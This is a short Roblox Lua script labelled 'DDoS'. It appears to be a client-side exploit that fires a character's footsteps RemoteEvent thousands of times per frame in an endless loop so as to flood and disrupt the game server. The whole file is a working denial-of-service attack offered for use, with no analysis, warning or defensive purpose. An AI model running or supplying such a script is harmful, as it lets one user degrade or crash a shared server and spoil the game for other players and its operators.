-- DDoS

local Players: Players = game:GetService("Players");
local Player: Player = Players.LocalPlayer;
local Character: Character = Player.Character;
local Footsteps = Character:WaitForChild("footsteps");
local RemoteEvent: RemoteEvent = Footsteps:WaitForChild("RemoteEvent");

local wait = task.wait;
local count: number = 900;

while true do
    if not Character then
        Player.CharacterAdded:Wait();
    end;
    wait();

    for i = 1, count do
        RemoteEvent:FireServer(Enum.Material.Concrete, Character);
        RemoteEvent:FireServer(Enum.Material.DiamondPlate, Character);
        RemoteEvent:FireServer(Enum.Material.Air, Character);
        RemoteEvent:FireServer(Enum.Material.Metal, Character);
        RemoteEvent:FireServer(Enum.Material.SmoothPlastic, Character);
        RemoteEvent:FireServer(Enum.Material.Rock, Character);
        RemoteEvent:FireServer(Enum.Material.Grass, Character);
        RemoteEvent:FireServer(Enum.Material.Sand, Character);
        RemoteEvent:FireServer(Enum.Material.Concrete, Character);
        RemoteEvent:FireServer(Enum.Material.DiamondPlate, Character);
        RemoteEvent:FireServer(Enum.Material.Air, Character);
        RemoteEvent:FireServer(Enum.Material.Metal, Character);
        RemoteEvent:FireServer(Enum.Material.SmoothPlastic, Character);
        RemoteEvent:FireServer(Enum.Material.Rock, Character);
        RemoteEvent:FireServer(Enum.Material.Grass, Character);
        RemoteEvent:FireServer(Enum.Material.Sand, Character);
    end;
end;
